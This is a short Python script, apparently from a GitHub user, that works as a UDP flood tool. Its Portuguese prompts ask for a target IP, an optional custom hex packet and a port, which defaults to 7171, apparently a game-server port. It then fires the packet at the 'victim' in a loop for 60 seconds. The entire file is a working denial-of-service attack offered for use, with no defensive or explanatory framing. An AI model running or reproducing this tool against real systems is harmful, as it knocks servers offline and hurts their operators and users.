import socket 
import random
import time

#create socket, packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
packet_data = '0C 00 6F 03 7C 0E 9C 8F 38 10 03 95 DD 86' 
victim_ip = '127.0.0.1' 
attack_port = 7171 

sent = 0 
standard_time = time.time()

print('Feito por Soly (Github.com/CoderDias) \n--------------------')
victim_ip = input('Digite o IP do alvo: ')

reply = input('Deseja usar um pacote custom? (y/n): ')

if(reply == 'y'):
	packet_data = input("Digite o PCK (EM HEX): ")

reply = input('Porta padrão é : 7171 \nDeseja usar uma porta diferente? (y/n): ')

if(reply == 'y'):
    attack_port = input('Digite a porta (1-65000): ')

reply = input('-------------------- \nPressione [ENTER] para iniciar o ataque!')
#attacks victim with packets until program is exitted
while(1): 
	end = time.time()
	#change if statement to wanted duration of attack 
	if(end - standard_time < 60):
		sock.sendto(bytes.fromhex(packet_data), (victim_ip, attack_port))
		sent = sent + 1
		print('Sent: ',sent,' packets to ', victim_ip)
	else:
		exit()
